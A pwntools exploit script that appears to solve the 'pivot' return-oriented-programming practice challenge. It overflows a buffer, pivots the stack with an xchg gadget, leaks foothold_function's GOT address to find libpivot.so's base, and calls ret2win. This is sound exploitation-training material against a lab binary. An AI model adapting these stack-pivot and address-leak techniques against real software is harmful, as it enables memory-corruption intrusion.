from pwn import *

context(arch='amd64', os='linux')
binary_name = 'pivot'
p = process('./'+binary_name)
# gdb.attach(p, 'break main')
elf =  ELF(binary_name)
libc_so = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_pivot = ELF("libpivot.so")
rop =  ROP(elf)

# 0x0000000000400b02 : xchg rax, rsp ; ret
xchg_rax_rsp = 0x400b02
# 0x0000000000400b00 : pop rax ; ret
pop_rax =      0x400b00
# 0x0000000000400b09 : add rax, rbp ; ret
add_rax_rbp =  0x400b09
# 0x0000000000400900 : pop rbp ; ret
pop_rbp =      0x400900
# 0x000000000040098e : call rax
call_rax =     0x40098e
# 0x0000000000400b05 : mov rax, qword ptr [rax] ; ret
mov_rax_rax =  0x400b05

foothold_function_PLT = elf.plt["foothold_function"]
foothold_function_GOT = elf.got["foothold_function"]
MAIN_PLT = elf.symbols['main']
PUTS_PLT = elf.plt['puts']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]

received = p.recvuntil("> ")
pivot_address = received.split("pivot: ")[1].split("\n")[0]
pivot_address_hexa = int(pivot_address, 16)

rop  = ""
rop += p64(foothold_function_PLT)
rop += p64(pop_rdi) + p64(foothold_function_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
rop += p64(pop_rax) + p64(foothold_function_GOT)
rop += p64(mov_rax_rax)
rop += p64(pop_rbp) + p64(0x14e)
rop += p64(add_rax_rbp)
rop += p64(call_rax)
p.sendline(rop)
recv = (p.recvline())

stack_pivot = "A" * 40 + p64(pop_rax) + p64(pivot_address_hexa) + p64(xchg_rax_rsp) 
p.sendline(stack_pivot)
recv = p.recvline()

leaked_address = recv.replace("\n","").replace("> ","")[-6:].ljust(8, "\x00")
libc_pivot.address = u64(leaked_address) - libc_pivot.symbols["foothold_function"]
ret2win = libc_pivot.sym["ret2win"]

log.info("foothold_function plt:    " + hex(foothold_function_PLT))
log.info("foothold_function GOT:    " + hex(foothold_function_GOT))
log.info("Main start:               " + hex(MAIN_PLT))
log.info("Puts plt:                 " + hex(PUTS_PLT))
log.info("pop rdi; ret:             " + hex(pop_rdi))
log.info("Pivot address:            " + str(pivot_address))
log.info("ret2win address:          " + hex(ret2win))
log.info("libpivot.so base address: " + hex(libc_pivot.address))
log.info("foothold_function leak:   " + (leaked_address))

p.interactive()